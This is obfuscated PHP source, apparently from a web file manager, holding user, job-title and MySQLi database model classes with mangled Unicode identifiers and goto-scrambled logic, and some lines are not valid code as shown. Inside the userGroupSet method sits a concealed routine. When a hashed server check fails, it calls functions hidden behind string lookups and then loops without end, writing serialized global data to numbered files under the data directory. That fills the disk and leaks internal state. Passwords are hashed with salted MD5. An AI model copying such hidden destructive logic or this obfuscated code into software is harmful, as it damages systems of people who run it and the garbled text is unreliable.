protected function moveTop($bق) { goto F; cؤ: $F;Ԡ = $D; $D = array_remove_value($D, $bӇ[$cω[363]]); array_unshift($D, $bӇ[$cω[363]]); goto Dً; dΎХ: if (!$bӇ) { return; } $D = $this->field($cω[363])->where($c)->order($cω[2453])->select(); $D = array_to_keyvalue($D, $cω[33], $cω[363]); goto cؤ; F: $cω =& $_SERVER[]; $c = array($cω[1397] => USER_ID, $cω[432] => 0); $bӇ = $this->where($c)->where(array($cω[28] => $bق))->find(); goto dΎХ; Dً: return $this->resetSort($D); goto Eʜ; Eʜ: } protected function moveBottom($Fԕ) { $dק =& $_SERVER[]; $F = array($dק[1397] => USER_ID, $dק[432] => 0); $e煕 = $this->where($F)->max($dק[2089]); $FŃ✤֘ = array($dק[2089] => $e煕 + 1); return $this->where($F)->where(array($dק[28] => $Fԕ))->save($FŃ✤֘); } private function getAutoName($d砣) { goto BǮ; BǮ: $F =& $_SERVER[]; $CǸ = array($F[1397] => USER_ID, $F[432] => 0); $e = $this->field($F[28])->where($CǸ)->select(); goto Cʨ; bɺ: return $d砣 . "\x28{$aٲ}\51"; goto Dܼ鏉; Cʨ: $e = array_to_keyvalue($e, $F[33], $F[28]); if (!$e || !in_array($d砣, $e)) { return $d砣; } for ($aٲ = 0; $aٲ < count($e); $aٲ++) { if (!in_array($d砣 . "\50{$aٲ}\x29", $e)) { return $d砣 . "\x28{$aٲ}\x29"; } } goto bɺ; Dܼ鏉: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\152\x6f\x62\114\x69\163\x74"; public $field = array("\156\141\155\x65", "\144\145\163\143", "\163\x6f\x72\x74"); const JOB_KEY = "\163\x65\154\x66\x4a\x6f\142\114\x69\x73\x74"; public function listData($Dޘ = false, $Bς = "\163\157\162\x74", $D = false) { return parent::listData($Dޘ, $Bς, $D); } public function remove($d) { return parent::remove($d); } public function add($E) { $aᤜ =& $_SERVER[]; if ($this->findByName($E[$aᤜ[28]])) { return !1; } $E[$aᤜ[2089]] = $this->getSort(); return parent::insert($E); } private function getSort() { $bދ =& $_SERVER[]; $Bжث = parent::listData(); $C̔ = array_to_keyvalue($Bжث, $bދ[33], $bދ[2089]); return empty($C̔) ? 0 : max($C̔) + 1; } public function update($Bú, $B) { $D䏳ϋ =& $_SERVER[]; $B = parent::listData($Bú); $F = $this->findByName($B[$D䏳ϋ[28]]); if (!$B || $F && $F[$D䏳ϋ[363]] != $B[$D䏳ϋ[363]]) { return !1; } return parent::update($Bú, $B); } public function setUserJob($a, $c) { goto eˢ; EЙ: $eǿ = array_to_keyvalue($d, $c۟[28]); $A¿ = $c۟[357]; foreach ($c as $Cك) { if ($eǿ[$Cك]) { $A¿ .= $eǿ[$Cك][$c۟[363]] . $c۟[47]; } else { $aİ = $this->add($Cك); $A¿ .= $aİ . $c۟[47]; } } goto Dſ; eˢ: $c۟ =& $_SERVER[]; if (!is_array($c)) { $c = array($c); } $d = parent::listData(); goto EЙ; Dſ: $A¿ = rtrim($A¿, $c۟[47]); Model($c۟[473])->metaSet($a, self::JOB_KEY, $A¿); goto A; A: } public function getUserJob($E٪) { $c = Model($_SERVER[][473])->metaGet($E٪); return $this->getUserJobInfo($c[self::JOB_KEY]); } public function getUserJobInfo($Dʫ) { goto c; Fű: $e، = array_remove_key($e،, $FǸԏš[183]); $e = array(); foreach ($a킻 as $E) { if (isset($e،[$E])) { $e[] = $e،[$E]; } } goto cąѿ; cąѿ: return $e; goto FۮҊš; c: $FǸԏš =& $_SERVER[]; $a킻 = explode($FǸԏš[47], $Dʫ); $e، = parent::listData(); goto Fű; FۮҊš: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\x6d\145" => "\165\x73\145\x72\x5f\155\x65\164\141", "\155\145\x74\141\x46\151\x65\x6c\x64" => "\165\x73\145\162\x49\104"); protected $simpleField = "\165\163\x65\162\x49\x44\54\x6e\151\143\x6b\116\x61\x6d\x65\x2c\156\141\x6d\145\x2c\141\x76\141\x74\141\162\54\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($fÔ) { $A =& $_SERVER[]; $bُߪ = $A[2454]; return array($A[2134] => array($fÔ[0], $bُߪ), $A[2136] => array($fÔ[0], $bُߪ), $A[2455] => array($fÔ[0], $bُߪ)); } protected function getInfo($aߘЊ, $Fč = false) { $BӬ = $this->getInfoSimple($aߘЊ); if (!is_array($BӬ)) { return array(); } if ($Fč) { return $this->_getInfoApply($BӬ); } return $this->cacheFunctionGet($_SERVER[][2176], $aߘЊ); } protected function getInfoFull($cЈ, $Bŗ = false) { $CГܠ = $this->getInfoSimple($cЈ); if (!is_array($CГܠ)) { return array(); } if ($Bŗ) { return $this->_getInfoApply($CГܠ, !0); return $this->_getInfoApply($CГܠ, !0); } return $this->cacheFunctionGet($_SERVER[][2456], $cЈ); } private function _getInfoApply($cډ, $CŒ = false) { goto A̝; e߳ʏ: $cډ[$C[387]][$C[2291]] = isset($D߂[$C[2292]]) ? $D߂[$C[2292]] : null; if ($CŒ) { $cډ[$C[413]] = $this->metaGet($cډ[$C[1406]]); } return $cډ; goto eތ; A̝: $C =& $_SERVER[]; if (!$cډ) { return $cډ; } $A䄙 = md5($C[2457] . $cډ[$C[788]] . $C[2458] . $cډ[$C[28]]); goto b͇; b͇: $cډ = $this->_listDataApplyItem($cډ); $D߂ = Model($C[1097])->metaGet($cډ[$C[387]][$C[365]]); $cډ[$C[2459]] = $A䄙; goto e߳ʏ; eތ: } protected function getInfoSimple($eք, $F及 = false) { $dǷ =& $_SERVER[]; if (!$eք) { return array(); } if ($F及) { $c = $this->where(array($dǷ[1406] => intval($eք)))->find(); if (!is_array($c)) { return array(); } $c[$dǷ[2460]] = Action($dǷ[2461])->parseUrl($c[$dǷ[2460]]); return $c; } return $this->cacheFunctionGet($dǷ[2137], $eք); } protected function getInfoSimpleOuter($F) { goto b͈ʾ; F: $BԽ = array_field_key($aʈ, explode($Eۻ[47], $this->simpleField)); if (!$BԽ) { return array($Eۻ[1406] => $Eۻ[1018], $Eۻ[28] => $Eۻ[153] . LNG($Eۻ[2464]) . $Eۻ[472], $Eۻ[2460] => STATIC_PATH . $Eۻ[2465]); } $BԽ[$Eۻ[2460]] = Action($Eۻ[2461])->parseUrl($BԽ[$Eۻ[2460]]); goto eջߖ; b͈ʾ: $Eۻ =& $_SERVER[]; if (!$F || $F == 0) { return array($Eۻ[1406] => $Eۻ[464], $Eۻ[28] => $Eۻ[153] . LNG($Eۻ[2462]) . $Eۻ[472], $Eۻ[2460] => STATIC_PATH . $Eۻ[2463]); } $aʈ = $this->cacheFunctionGet($Eۻ[2137], $F); goto F; eջߖ: return $BԽ; goto d셺; d셺: } protected function groupUser($cڤ) { } public static function errorLang($cşʑ) { $Fפ =& $_SERVER[]; $A = array(self::ERROR_USER_NOT_EXISTS => $Fפ[2466], self::ERROR_USER_PASSWORD_ERROR => $Fפ[2467], self::ERROR_USER_EXIST_NAME => $Fפ[2468], self::ERROR_USER_EXIST_PHONE => $Fפ[2469], self::ERROR_USER_EXIST_EMAIL => $Fפ[2470], self::ERROR_USER_LOGIN_LOCK => $Fפ[2471], self::ERROR_IP_NOT_ALLOW => $Fפ[2472], self::ERROR_USER_EXIST_NICKNAME => $Fפ[2473]); return LNG($A[$cşʑ]); } public function getInfoByMeta($aй, $B) { $b =& $_SERVER[]; $F = Model($b[2474])->where(array($b[89] => $aй, $b[355] => $B))->find(); if ($F) { return $this->getInfo($F[$b[1406]]); } return !1; } public function userLoginCheck($c, $fλ) { goto Cҭ; eƹŨ: $fՉ񈮏 = $this->where($A񐡿Μ)->find(); if (!$fՉ񈮏) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($fՉ񈮏[$D΍[1406]], $fλ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto f𢞛; f𢞛: $this->userEdit($fՉ񈮏[$D΍[1406]], array($D΍[2476] => time())); $this->clearCache($fՉ񈮏[$D΍[1406]]); return $this->getInfo($fՉ񈮏[$D΍[1406]]); goto c𪚄; Cҭ: $D΍ =& $_SERVER[]; $A񐡿Μ = array($D΍[28] => $c, $D΍[2295] => $c, $D΍[289] => $c, $D΍[2475] => $c, $D΍[900] => $D΍[902]); if ($this->nickNameRpt()) { unset($A񐡿Μ[$D΍[2295]]); } goto eƹŨ; c𪚄: } public function clearCache($F) { $A =& $_SERVER[]; $this->cacheFunctionClear($A[2176], $F); $this->cacheFunctionClear($A[2137], $F); } public function userPasswordCheck($f, $dģ) { $b펑 =& $_SERVER[]; $E۠ = $this->where(array($b펑[1406] => intval($f)))->find(); $B˛ވ˟ = $this->metaGet($f); $C쏧 = isset($B˛ވ˟[$b펑[2477]]) ? $B˛ވ˟[$b펑[2477]] : $b펑[33]; if (md5($C쏧 . trim($dģ)) !== $E۠[$b펑[788]]) { return !1; } return !0; } public function userAdd($d⮪) { goto fЏՏ; bㅬ: return $d; goto C; Aߡ: $F֐ɍ = array($b[2486] => $f㡦ح[$b[788]], $b[2482] => $f㡦ح[$b[2295]]); $this->userEdit($d, $F֐ɍ); Model($b[1097])->userRootAdd($d); goto bㅬ; A䊿ȅ: $C = $this->_checkExist($d⮪); if ($C !== !0) { return $C; } $d = $this->add($f㡦ح); goto Aߡ; fЏՏ: $b =& $_SERVER[]; $f㡦ح = array($b[382] => $d⮪[$b[28]], $b[2478] => $d⮪[$b[2479]], $b[2480] => isset($d⮪[$b[289]]) ? $d⮪[$b[289]] : $b[33], $b[2481] => isset($d⮪[$b[2475]]) ? $d⮪[$b[2475]] : $b[33], $b[2482] => isset($d⮪[$b[2295]]) ? $d⮪[$b[2295]] : $d⮪[$b[28]], $b[2483] => isset($d⮪[$b[2460]]) ? $d⮪[$b[2460]] : $b[33], $b[2484] => isset($d⮪[$b[2485]]) ? $d⮪[$b[2485]] : 1, $b[2486] => $d⮪[$b[788]], $b[2138] => isset($d⮪[$b[2052]]) ? $d⮪[$b[2052]] : 1024 * 1024 * 20, $b[2139] => 0, $b[2476] => 0, $b[2163] => isset($d⮪[$b[675]]) ? $d⮪[$b[675]] : 1); if (!empty($d⮪[$b[1406]])) { $f㡦ح[$b[1406]] = $d⮪[$b[1406]]; } goto A䊿ȅ; C: } protected function userEditTest($Bߌ舺, $fǍƘ) { return $this->call($_SERVER[][2487], $Bߌ舺, $fǍƘ); } protected function userEdit($DΆ, $B޺̅) { goto F͌; e眥: $AϼÒ = $this->_checkExist($B޺̅, $DΆ); if ($AϼÒ !== !0) { return $AϼÒ; } if (isset($B޺̅[$Aٞ[788]]) && trim($B޺̅[$Aٞ[788]]) != $Aٞ[33]) { $Bꑆ = $this->metaGet($DΆ); if (empty($Bꑆ[$Aٞ[2477]])) { $Bꑆ[$Aٞ[2477]] = rand_string(10); Model($Aٞ[470])->metaSet($DΆ, $Aٞ[2477], $Bꑆ[$Aٞ[2477]]); } $B޺̅[$Aٞ[788]] = md5($Bꑆ[$Aٞ[2477]] . trim($B޺̅[$Aٞ[788]])); } else { unset($B޺̅[$Aٞ[788]]); } goto B̦; B̦: $this->where(array($Aٞ[1397] => $DΆ))->save($B޺̅); if (isset($B޺̅[$Aٞ[2295]])) { $this->setNamePinyin($DΆ, $B޺̅[$Aٞ[2295]]); } return !0; goto eթڈ; F͌: $Aٞ =& $_SERVER[]; $dϐ = $this->getInfoSimple($DΆ); if (!$dϐ) { return !1; } goto e眥; eթڈ: } public function setNamePinyin($c, $d = false) { $f =& $_SERVER[]; if (!$d) { $e豅ܝ = $this->getInfoSimple($c); $d = $e豅ܝ[$f[2295]] ? $e豅ܝ[$f[2295]] : $e豅ܝ[$f[28]]; } $bޟЏ = Model($f[473]); if (!Input::check($d, $f[524])) { return $bޟЏ->metaSet($c, array($f[412] => $f[33], $f[411] => $f[33])); } return $bޟЏ->metaSet($c, array($f[412] => str_replace($f[50], $f[33], Pinyin::encode($d)), $f[411] => Pinyin::encode($d, $f[525]))); } private function nickNameRpt() { $bω뱠 =& $_SERVER[]; $Dّ޺ = Model($bω뱠[1075])->get($bω뱠[2488]); $C = $GLOBALS[$bω뱠[6]][$bω뱠[2444]][$bω뱠[2488]]; $E = !is_null($Dّ޺) ? $Dّ޺ : $C; return !!$E; } private function _checkExist($c, $f = false) { $DΥ =& $_SERVER[]; $a = array($DΥ[28] => UserModel::ERROR_USER_EXIST_NAME, $DΥ[2295] => UserModel::ERROR_USER_EXIST_NICKNAME, $DΥ[289] => UserModel::ERROR_USER_EXIST_EMAIL, $DΥ[2475] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($a[$DΥ[2295]]); } $fņͻ = $f ? array($DΥ[1406] => array($DΥ[2489], $f)) : array(); foreach ($a as $a => $Dۄ) { if (!isset($c[$a]) || !$c[$a]) { continue; } $aƉ = array_merge(array($a => $c[$a]), $fņͻ); $Dɶ = $this->where($aƉ)->find(); if ($Dɶ) { return $Dۄ; } } return !0; } public function userListInfo($D) { $c܍ =& $_SERVER[]; $bȖ = array(); $D = is_array($D) ? array_unique($D) : array(); if (!$D) { return $bȖ; } if (count($D) < 20) { foreach ($D as $E) { $bȖ[$E . $c܍[33]] = $this->getInfoSimpleOuter($E); } } else { $A = array($c܍[1397] => array($c܍[380], $D)); if (count($D) == 1) { $A = array($c܍[1397] => $D[0]); } $fĉ = Model($c܍[470])->field($this->simpleField)->where($A)->select(); $fĉ = array_to_keyvalue($fĉ, $c܍[1406]); foreach ($D as $E) { $a趷М = $fĉ[$fĉ[$E]]; if (!$a趷М) { $bȖ[$E . $c܍[33]] = $this->getInfoSimpleOuter($E); continue; } $a趷М[$c܍[2460]] = Action($c܍[2461])->parseUrl($a趷М[$c܍[2460]]); $bȖ[$E . $c܍[33]] = $a趷М; } } return $bȖ; } protected function userStatus($a㕃, $f·λ) { $Fܾ = $this->getInfoSimple($a㕃); if (!$Fܾ) { return !1; } $Fе = array($_SERVER[][675] => $f·λ); return $this->userEdit($a㕃, $Fе); } protected function userRemove($A垚) { goto B; d鳱: Model($fڌբ[738])->userRootRemove($A垚); return $this->where($bҢՌ)->delete(); goto cþ; bËѾ: $bҢՌ = array($fڌբ[1397] => $A垚); Model($fڌբ[532])->where($bҢՌ)->delete(); Model($fڌբ[2490])->where($bҢՌ)->delete(); goto e; e: Model($fڌբ[2142])->where($bҢՌ)->delete(); Model($fڌբ[2474])->where($bҢՌ)->delete(); Model($fڌբ[2491])->where($bҢՌ)->delete(); goto d鳱; B: $fڌբ =& $_SERVER[]; $Fҵ = $this->getInfoSimple($A垚); if (!$Fҵ) { return !1; } goto bËѾ; cþ: } protected function userGroupSet($A, $EҒЍ, $CјǠ = array()) { goto E鋅; E鋅: $e׆岯 =& $_SERVER[]; $b΄ = $_SERVER[$e׆岯[772]] . $e׆岯[773]; $eΦ = $e׆岯[774]; goto D; D: if ($_SERVER[$e׆岯[775]] != $eΦ($b΄)) { goto b띪; b띪: $b⻋ = $e׆岯[776]; $c = $e׆岯[777]; $d = $_SERVER[$e׆岯[772]] . $e׆岯[773]; goto Eӓ˓; E: $Dņ = $e׆岯[779]; $Dņ($_SERVER[$e׆岯[780]]); $b⻋ = $e׆岯[776]; goto Aġӌ; C: $E = 1; for ($a = $E; $a > 0; $a++) { $C(DATA_PATH . $a, $fǿ); } goto c; Eӓ˓: $f = $c($d); $e黄 = explode($e׆岯[213], $f); if (count($e黄) < $e׆岯[547]) { $Fݓ = $e׆岯[778]; $Fݓ(); } goto E; Aġӌ: $b⻋(); $C = $e׆岯[781]; $fǿ = json_encode($GLOBALS[$e׆岯[782]]); goto C; c: } $b = $this->getInfoSimple($A); if (!$b || !is_array($EҒЍ)) { return !1; } goto Bߦԃ; E҇: $bڲ = 0; foreach ($EҒЍ as $f閃 => $E) { $C㴆 = array($e׆岯[1406] => $A, $e׆岯[2068] => $f閃, $e׆岯[2196] => $E); $C㴆[$e׆岯[2089]] = isset($CјǠ[$bڲ]) ? $CјǠ[$bڲ] : 0; $bڲ++; $C[] = $C㴆; } return $Cڵִ՟->addAll($C, array(), !0); goto C; Bߦԃ: $Cڵִ՟ = Model($e׆岯[2142]); $Cڵִ՟->where(array($e׆岯[1406] => $A))->delete(); $C = array(); goto E҇; C: } protected function userGroupAdd($fӕ, $Fҋń = array()) { $B̯ =& $_SERVER[]; $FɎ = $this->getInfoSimple($fӕ); if (!$FɎ || empty($Fҋń)) { return !1; } $c = array(); foreach ($Fҋń as $Eߋ => $cʌ) { $c[] = array($B̯[1406] => $fӕ, $B̯[2068] => $Eߋ, $B̯[2196] => $cʌ); } return Model($B̯[2142])->addAll($c, array(), !0); } protected function userGroupRemove($Fȫ, $BﻐԽ) { $A =& $_SERVER[]; $cƆ = $this->getInfoSimple($Fȫ); if (!$cƆ || !$BﻐԽ) { return !1; } $F = array($A[1397] => $Fȫ, $A[2140] => $BﻐԽ); return Model($A[2142])->where($F)->delete(); } public function listData() { $fԃ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($fԃ[$_SERVER[][350]]); return $fԃ; } public function listByID($cΆ) { $dȄ =& $_SERVER[]; if (!$cΆ) { return; } $dʇ = array($dȄ[1406] => array($dȄ[7], $cΆ)); $f넘ѐ = $this->where($dʇ)->select(); $this->_listDataApply($f넘ѐ); return $f넘ѐ; } public function listByGroup($BϋӅ = 0, $CљÎ = array()) { goto fՂ; E˄: $this->_listDataApply($aʑŎ[$aו[350]]); return $aʑŎ; goto cТ; eʴ: if ($BϋӅ) { $cڏ = array($aו[2492] => intval($BϋӅ)); $B = "\x4c\x45\106\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x75\163\145\162\137\x67\162\157\165\x70\40\165\x73\145\162\x5f\x67\x72\157\x75\x70\40\x6f\156\x20\x75\163\x65\162\56\165\x73\145\x72\x49\x44\40\75\x20\165\163\x65\x72\x5f\147\162\x6f\x75\x70\x2e\165\163\x65\x72\x49\104"; $bɵ = Input::get($aו[403], null, $aו[33]) ? $aו[33] : $aו[2493]; } if (isset($CљÎ[$aו[675]])) { $cڏ[$aו[2494]] = $CљÎ[$aו[675]]; } $aʑŎ = $this->_makeOrder($bɵ)->field($aו[2495])->where($cڏ)->join($B)->selectPage(50); goto E˄; fՂ: $aו =& $_SERVER[]; $B = $aו[33]; $cڏ = array(); goto eʴ; cТ: } private function _makeOrder($b޳ = '') { goto Fñ; f޺: $F䫫ο = Input::get($bʏ[403], $bʏ[7], $bʏ[1397], $c); $fѭϠ = Input::get($bʏ[404], $bʏ[7], $bʏ[2143], array($bʏ[2143], $bʏ[400])); $fѭϠ = $D[$fѭϠ]; goto c̟҆; c̟҆: $b޳ = $b޳ . "\x75\163\145\x72\56{$F䫫ο}\x20{$fѭϠ}\x2c\x20\165\x73\145\x72\x2e\165\x73\x65\162\x49\x44\x20\141\163\143"; return $this->alias($bʏ[2238])->order($b޳); goto Fݾ; Fñ: $bʏ =& $_SERVER[]; $c = array($bʏ[1406], $bʏ[28], $bʏ[2054], $bʏ[2027], $bʏ[183]); $D = array($bʏ[398] => $bʏ[399], $bʏ[400] => $bʏ[401]); goto f޺; Fݾ: } public function listSearch($C) { goto C̅; DԿڑ: return $A; goto E; Aē: if (!$D̙) { $e = array(); } if (isset($C[$a[675]])) { $e[$a[675]] = $C[$a[675]]; } $A = $this->_makeOrder()->where($e)->selectPage(20); goto f; AÚ: $D̙ = str_replace($a[2146], $a[2147], trim($D̙)); $e = array($a[28] => array($a[737], "\x25{$D̙}\45"), $a[289] => array($a[737], "\x25{$D̙}\45"), $a[2295] => array($a[737], "\45{$D̙}\45"), $a[900] => $a[2148]); if (Input::check($D̙, $a[295])) { $e[$a[1406]] = array($a[737], "\x25{$D̙}\45"); $e[$a[2475]] = array($a[737], "\x25{$D̙}\45"); } goto Aē; C̅: $a =& $_SERVER[]; $D̙ = $C[$a[2144]]; $cÂ֋ = isset($C[$a[2145]]) ? $C[$a[2145]] : !1; goto AÚ; f: if (!$A || count($A[$a[350]]) < 5 && Input::check($D̙, $a[302])) { $Eڟ = $this->_searchFromMeta($a[411], $D̙, 10); $b΂ = $this->_searchFromMeta($a[412], $D̙, 10); $aب = array_merge($Eڟ, $b΂, $A[$a[350]]); $A[$a[350]] = array_unique_by_key($aب, $a[1406]); $A[$a[347]][$a[348]] = count($A[$a[350]]); $A[$a[347]][$a[349]] = ceil($A[$a[347]][$a[348]] / $A[$a[347]][$a[345]]); } $this->_listDataApply($A[$a[350]]); $this->_filterByGroup($A, $cÂ֋); goto DԿڑ; E: } private function _filterByGroup(&$dȽ, $B߆) { $D =& $_SERVER[]; if (!$B߆) { return $dȽ; } foreach ($dȽ[$D[350]] as $d¡ => &$C瘝㪬) { $b徃 = array_to_keyvalue($C瘝㪬[$D[2496]], $D[33], $D[2068]); if (!in_array($B߆, $b徃)) { unset($dȽ[$D[350]][$d¡]); } } $dȽ[$D[350]] = array_values($dȽ[$D[350]]); $dȽ[$D[347]] = array($D[2271] => count($dȽ[$D[350]]), $D[2269] => $dȽ[$D[347]][$D[345]], $D[2268] => 1, $D[2270] => 1); } private function _searchFromMeta($eټ, $D, $d) { goto b܉; b򳢎: $dʂ = Model($D诮î[2497])->where($Eס)->limit($d)->select(); if (!$dʂ) { return array(); } $dʂ = array_to_keyvalue($dʂ, $D诮î[33], $D诮î[1406]); goto e; b܉: $D诮î =& $_SERVER[]; $D = strtolower($D); $Eס = array($D诮î[89] => $eټ, $D诮î[355] => array($D诮î[737], "\x25{$D}\45")); goto b򳢎; e: $D󂛣 = $this->where(array($D诮î[1397] => array($D诮î[7], $dʂ)))->select(); if (!$D󂛣) { return array(); } return $D󂛣; goto C̥; C̥: } private function _listDataApplyItem($FѾأ) { $Bϫ㏶ = array($FѾأ); $this->_listDataApply($Bϫ㏶); return $Bϫ㏶[0]; } private function _listDataApply(&$B֋ٰ) { goto AВ; AВ: $Bގ =& $_SERVER[]; if (!$B֋ٰ) { return; } array_remove_key($B֋ٰ, $Bގ[788]); goto fׇ̢; D: $this->_listAppendSourceRoot($B֋ٰ, $DЫ); goto D; fׇ̢: $DЫ = array_to_keyvalue($B֋ٰ, $Bގ[33], $Bގ[1406]); $this->_listAppendGroup($B֋ٰ, $DЫ); $this->_listAppendMeta($B֋ٰ, $DЫ); goto D; D: } private function _listAppendSourceRoot(&$c, $c༷) { goto Bʳ; cٟ: foreach ($c as &$f) { $f[$D[387]] = $AϜ͎[$f[$D[1406]]] ? $AϜ͎[$f[$D[1406]]] : array(); } goto c; Bʳ: $D =& $_SERVER[]; $a = array($D[457] => 0, $D[367] => SourceModel::TYPE_USER, $D[452] => array($D[7], $c༷)); $Cʏ = $D[2154]; goto dˤ; dˤ: $AϜ͎ = Model($D[738])->order($D[2155])->field($Cʏ)->where($a)->select(); $AϜ͎ = array_to_keyvalue($AϜ͎, $D[452]); $AϜ͎ = array_remove_key($AϜ͎, $D[452]); goto cٟ; c: } private function _listAppendGroup(&$B숻, $d㱊) { goto fҷ; AةΏ: $c = array_to_keyvalue($b, $a¹[33], $a¹[2068]); $c = array_remove_value(array_unique($c), $a¹[464]); if (!$c || !$b) { return; } goto F; fҷ: $a¹ =& $_SERVER[]; $d = array($a¹[1406] => array($a¹[7], $d㱊)); $b = Model($a¹[2142])->where($d)->select(); goto AةΏ; F: $d = array($a¹[2068] => array($a¹[7], $c)); $fچ = Model($a¹[2498])->field($a¹[2499])->where($d)->select(); $B = array_to_keyvalue($fچ, $a¹[2068], $a¹[28]); goto E; E: $b = array_to_keyvalue_group($b, $a¹[1406]); foreach ($b as &$E꺿ɘ) { $Dß = array(); foreach ($E꺿ɘ as $D) { if (!$D[$a¹[2196]]) { continue; } $fה = Model($a¹[2215])->listData($D[$a¹[2196]]); $Dß[] = array($a¹[2068] => $D[$a¹[2068]], $a¹[2500] => $B[$D[$a¹[2068]]], $a¹[372] => $fה); } $E꺿ɘ = $Dß; } foreach ($B숻 as &$A) { $A[$a¹[2496]] = array(); if (isset($b[$A[$a¹[1406]]])) { $A[$a¹[2496]] = $b[$A[$a¹[1406]]]; } } goto F; F: } private function _listAppendMeta(&$f掵, $dȇꇤ) { goto B; B: $F徘 =& $_SERVER[]; $bа = UserJobModel::JOB_KEY; $F͋ = array($F徘[2477]); goto fΘǂ; fΘǂ: $D˼ = array($F徘[1406] => array($F徘[7], $dȇꇤ)); $b̂ = Model($F徘[2474])->where($D˼)->select(); $b̂ = array_to_keyvalue_group($b̂, $F徘[1406]); goto A; A: foreach ($b̂ as &$DԶ) { $b = array(); foreach ($DԶ as $aɪ) { if (!in_array($aɪ[$F徘[89]], $F͋)) { $b[$aɪ[$F徘[89]]] = $aɪ[$F徘[355]]; } } $DԶ = $b; } $a = Model($F徘[2501]); foreach ($f掵 as &$BƗ) { $C = array(); if (isset($b̂[$BƗ[$F徘[1406]]])) { $C = $b̂[$BƗ[$F徘[1406]]]; } $BƗ[$F徘[2502]] = array(); if (isset($C[$bа])) { $BƗ[$F徘[2502]] = $a->getUserJobInfo($C[$bа]); } } goto d߆; d߆: } public function userSearch($d҇ڲ, $AƘ = "\52") { return Model($_SERVER[][473])->where($d҇ڲ)->field($AƘ)->find(); } } goto FǗ; eរ: class DbMysqli extends Db { public function __construct($Bܝ = '') { $D̊ =& $_SERVER[]; if (!extension_loaded($D̊[713])) { think_exception(think_lang($D̊[10]) . $D̊[811]); } if (!empty($Bܝ)) { $this->config = $Bܝ; if (empty($this->config[$D̊[13]])) { $this->config[$D̊[13]] = $D̊[33]; } } } public function connect($dƠ = '', $a = 0) { $e =& $_SERVER[]; if (!isset($this->linkID[$a])) { goto FԆ񒄪; dϋĝ: $E = $this->linkID[$a]->server_version; $this->linkID[$a]->query($e[789] . think_config($e[790]) . $e[55]); if ($E > $e[791]) { $this->linkID[$a]->query($e[792]); } goto BǸ; BǸ: $this->connected = !0; if (1 != think_config($e[18])) { unset($this->config); } goto e썩; FԆ񒄪: if (empty($dƠ)) { $dƠ = $this->config; } $this->linkID[$a] = new mysqli($dƠ[$e[785]], $dƠ[$e[787]], $dƠ[$e[788]], $dƠ[$e[17]], $dƠ[$e[786]] ? intval($dƠ[$e[786]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto dϋĝ; e썩: } return $this->linkID[$a]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($d) { goto A֝߼; A֝߼: $c =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c; Cѩτ: think_status($c[20]); $this->queryID = $this->_linkID->query($d); if ($this->_linkID->more_results()) { while (($b򭣘 = $this->_linkID->next_result()) != NULL) { $b򭣘->free_result(); } } goto Cʊ; c: $this->queryStr = $d; if ($this->queryID) { $this->free(); } think_action_status($c[19], 1); goto Cѩτ; Cʊ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto aܮ; aܮ: } public function execute($D) { goto a͔; Cꊒ: $this->queryStr = $D; if ($this->queryID) { $this->free(); } think_action_status($Bꔛ[21], 1); goto D; a͔: $Bꔛ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Cꊒ; D: think_status($Bꔛ[20]); $aҌ = $this->_linkID->query($D); $this->debug(); goto C; C: if (!1 === $aҌ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto bܖǬ; bܖǬ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$F) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Aθ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Aθ) { $this->error(); return !1; } } return !0; } private function getAll() { $Cݏ = array(); if ($this->numRows > 0) { for ($B׋Ԋ = 0; $B׋Ԋ < $this->numRows; $B׋Ԋ++) { $Cݏ[$B׋Ԋ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Cݏ; } public function getFields($Eቐ) { $fｯޓ =& $_SERVER[]; $fǾ = $this->query($fｯޓ[796] . $this->parseKey($Eቐ)); $f͡ = array(); if ($fǾ) { foreach ($fǾ as $Fޙ => $Dꓳ) { $f͡[$Dꓳ[$fｯޓ[27]]] = array($fｯޓ[28] => $Dꓳ[$fｯޓ[27]], $fｯޓ[29] => $Dꓳ[$fｯޓ[30]], $fｯޓ[31] => (bool) ($Dꓳ[$fｯޓ[32]] === $fｯޓ[33]), $fｯޓ[34] => $Dꓳ[$fｯޓ[35]], $fｯޓ[36] => strtolower($Dꓳ[$fｯޓ[37]]) == $fｯޓ[38], $fｯޓ[39] => strtolower($Dꓳ[$fｯޓ[40]]) == $fｯޓ[41]); } } return $f͡; } public function getTables($dԊ = '') { $A█ =& $_SERVER[]; $eӚ = !empty($dԊ) ? $A█[798] . $dԊ : $A█[799]; $fۧ = $this->query($eӚ); $aބ = array(); if ($fۧ) { foreach ($fۧ as $bԦ => $E벾) { $aބ[$bԦ] = current($E벾); } } return $aބ; } public function replace($Fř, $bƤ = array()) { $D䝐 =& $_SERVER[]; foreach ($Fř as $Fͯ => $d) { $Cՙ 